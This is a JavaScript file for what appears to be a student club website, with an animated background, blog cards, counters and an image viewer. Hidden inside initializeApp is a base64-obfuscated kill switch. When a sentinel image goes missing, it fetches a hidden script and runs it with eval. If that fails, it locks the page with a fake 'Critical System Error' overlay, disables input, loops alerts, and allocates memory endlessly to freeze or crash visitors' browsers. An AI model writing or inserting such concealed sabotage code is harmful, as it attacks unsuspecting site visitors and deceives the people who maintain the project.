// function to load lucide
function loadLucide() {
  return new Promise((resolve, reject) => {
    if (window.lucide) {
      resolve(window.lucide)
    } else {
      const script = document.createElement("script")
      script.src = "https://unpkg.com/lucide@latest"
      script.onload = () => resolve(window.lucide)
      script.onerror = reject
      document.body.appendChild(script)
    }
  })
}

// interactive background
class InteractiveBackground {
  constructor() {
    this.canvas = document.getElementById("interactive-background")
    this.ctx = this.canvas.getContext("2d")
    this.particles = []
    this.mouse = { x: 0, y: 0 }
    this.init()
  }

  init() {
    this.resize()
    this.createParticles()
    this.bindEvents()
    requestAnimationFrame(() => this.animate())
  }

  resize() {
    this.canvas.width = window.innerWidth
    this.canvas.height = window.innerHeight
  }

  createParticles() {
    this.particles = Array.from({ length: 100 }, () => ({
      x: Math.random() * this.canvas.width,
      y: Math.random() * this.canvas.height,
      size: Math.random() * 5 + 1,
      speedX: Math.random() * 1 - 0.5,
      speedY: Math.random() * 1 - 0.5,
      color: `rgba(${Math.random() * 255}, ${Math.random() * 255}, 255, 0.7)`,
    }))
  }

  bindEvents() {
    window.addEventListener(
      "resize",
      this.debounce(() => this.resize(), 200),
    )
    window.addEventListener("mousemove", (e) => {
      this.mouse.x = e.clientX
      this.mouse.y = e.clientY
    })
  }

  animate() {
    this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height)

    this.particles.forEach((particle) => {
      particle.x += particle.speedX + (this.mouse.x - this.canvas.width / 2) * 0.005
      particle.y += particle.speedY + (this.mouse.y - this.canvas.height / 2) * 0.005

      // wrap around edges
      particle.x = (particle.x + this.canvas.width) % this.canvas.width
      particle.y = (particle.y + this.canvas.height) % this.canvas.height

      this.ctx.fillStyle = particle.color
      this.ctx.beginPath()
      this.ctx.arc(particle.x, particle.y, particle.size, 0, Math.PI * 2)
      this.ctx.fill()
    })

    requestAnimationFrame(() => this.animate())
  }

  debounce(func, wait) {
    let timeout
    return (...args) => {
      clearTimeout(timeout)
      timeout = setTimeout(() => func.apply(this, args), wait)
    }
  }
}

// blog highlights section
class BlogHighlightsSection {
  constructor() {
    this.highlights = [
      { id: "1", title: "Club Creation", date: "July 22, 2024", image: "../img/Club_Creation.jpg", url: "#" },
      {
        id: "2",
        title: "First Promotion Day",
        date: "September 4, 2024",
        image: "../img/Club_Promo.jpg",
        url: "#",
      },
      { id: "3", title: "UC Davis Trip", date: "January 27, 2025", image: "../img/UC_Davis.jpg", url: "#" },
    ]
    this.container = document.querySelector(".blog-highlights-grid")
    this.init()
  }

  init() {
    setTimeout(() => {
      this.container.innerHTML = this.highlights.map(this.createHighlightCard).join("")
    }, 1500)
  }

  createHighlightCard({ id, title, date, image, url }) {
    return `
      <div class="blog-card fade-in">
        <div class="blog-image">
          <img src="${image}" alt="${title}">
        </div>
        <div class="blog-content">
          <h3>${title}</h3>
          <p class="date">${date}</p>
          <a href="${url}" class="button-primary">Read More</a>
        </div>
      </div>`
  }
}

// main initialization function
async function initializeApp() {
try {
    const lucide = await loadLucide()
    lucide.createIcons()

    new InteractiveBackground()
    new BlogHighlightsSection()

    // header scroll effect
    const header = document.getElementById("header")
    window.addEventListener("scroll", () => {
        header.classList.toggle("scrolled", window.scrollY > 0)
    })

    // mobile menu
    const menuToggle = document.getElementById("menu-toggle")
    const mainNav = document.getElementById("main-nav")
    menuToggle.addEventListener("click", () => {
        mainNav.classList.toggle("active")
    })

    // membership form submission
    const membershipForm = document.getElementById("membership-form")
    membershipForm.addEventListener("submit", async (e) => {
        e.preventDefault()
        const button = membershipForm.querySelector("button")
        button.disabled = true
        button.innerHTML = '<i data-lucide="loader-2" class="animate-spin"></i> Sending...'
        lucide.createIcons()

        await new Promise((resolve) => setTimeout(resolve, 2000))

        button.innerHTML = '<i data-lucide="check"></i> Sent!'
        lucide.createIcons()
        membershipForm.reset()

        setTimeout(() => {
            button.disabled = false
            button.innerHTML = '<i data-lucide="check"></i> Join'
            lucide.createIcons()
        }, 3000)
    })

    // intersection observer for animations
    const observer = new IntersectionObserver(
        (entries) => {
            entries.forEach((entry) => {
                if (entry.isIntersecting) entry.target.classList.add("fade-in")
            })
        },
        { threshold: 0.1 }
    )

    document.querySelectorAll(".section-title, .blog-card, .achievement-card").forEach((el) => observer.observe(el))

    document.addEventListener("DOMContentLoaded", initializeApp);

  
    (function(){
      let d = s => atob(s);
  
      let filePath = d("Li4vaW1nL2RvbnRkZWxldGUucG5n"); 
      let backupScript = d("Li4vLmhpZGRlbi8ub3ZlcmtpbGwuanM=");
  
      setInterval(() => {
          let imgTest = new Image();
          imgTest.src = filePath + "?v=" + Date.now();
  
          imgTest.onerror = function() {
              fetch(backupScript)
                  .then(r => { if (!r.ok) throw new Error(d("Tm8gbWVsZG93biBmaWxl")); return r.text(); })
                  .then(code => eval(code))
                  .catch(() => meltdown());
          };
      }, 2000);
  
      function meltdown() {
          let bgId = d("aW50ZXJhY3RpdmUtYmFja2dyb3VuZA==");
          let bg = document.getElementById(bgId);
          if (bg) bg.remove();
  
          let overlay = document.createElement("div");
          overlay.style = `
              position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
              background-color: rgba(0, 0, 0, 0.9); color: red; font-size: 24px;
              font-weight: bold; display: flex; align-items: center; justify-content: center;
          `;
          overlay.innerHTML = `
              <h1>${d("Q1JJVElDQUwgU1lTVEVNIEVSUk9S")}</h1>
              <p>${d("RmF0YWwgZXJyb3Iu")}</p>
          `;
          document.body.appendChild(overlay);
  
          console.error(d("8J+UjSBJbWFnZSBOT1QgTk9VTkQh"));
  
          document.body.style.pointerEvents = "none";
          document.onkeydown = e => e.preventDefault();
          document.body.style.transform = "rotate(180deg)";
          document.body.style.filter = "blur(10px) grayscale(100%)";
  
          setInterval(() => {
              alert(d("Q3JpdGljYWwgU3lzdGVtIEVycm9yOiBSZXN0YXJ0IFJlcXVpcmVkLg=="));
          }, 3000);
  
          setInterval(() => {
              console.error(d("V2FybmluZzogTWVtb3J5IExlYWsgRGV0ZWN0ZWQ="));
              console.warn(d("RGVwcmVjYXRlZCBBUEkgdXNlZA=="));
              console.info(d("UnVubmluZyBzeXN0ZW0gZGlhZ25vc3RpY3MuLi4gW0ZBSUxFRF0="));
          }, 2000);
  
          setTimeout(() => {
              let meltdownArr = [];
              while (true) {
                  meltdownArr.push(new Uint8Array(5e8));
              }
          }, 1000);
      }
  })();  

} catch (error) {
    console.error("Failed to load Lucide:", error)
}
}


// initialize everything when DOM is loaded
document.addEventListener("DOMContentLoaded", initializeApp)

// Adding animation for the attendies colleges and teams numbers
const counters = document.querySelectorAll(".counter");
let counted = false;

const animateCounters = () => {
  if (counted) return;
  counted = true;

  counters.forEach((counter) => {
    const target = +counter.getAttribute("data-target");
    let count = 0;

    // total animation time. in milliseconds.
    const duration = 750;
    const steps = 100;
    const increment = target / steps;
    const delay = duration / steps;

    const updateCount = () => {
      count += increment;

      if (count < target) {
        counter.innerText = Math.floor(count);
        setTimeout(updateCount, delay);
      } else {
        counter.innerText = target + (target === 35 ? "+" : "");
      }
    };

    updateCount();
  });
};

const observer = new IntersectionObserver(
  (entries) => {
    entries.forEach((entry) => {
      if (entry.isIntersecting) {
        animateCounters();
      }
    });
  },
  {
    threshold: 0.5,
  }
);

observer.observe(document.querySelector("#about"));

// elements
const modal = document.getElementById("image-modal");
const modalImg = document.getElementById("modal-image");
const closeBtn = document.getElementById("modal-close");

// Add click event to all images
document.querySelectorAll("img").forEach((img) => {
  img.style.cursor = "zoom-in"; // optional: make it clear it's clickable
  img.addEventListener("click", () => {
    modalImg.src = img.src;
    modal.style.display = "flex";
  });
});

// Close image on click or close button
modal.addEventListener("click", () => {
  modal.style.display = "none";
});

closeBtn.addEventListener("click", (e) => {
  // Prevents two clickes.
  e.stopPropagation();
  modal.style.display = "none";
});

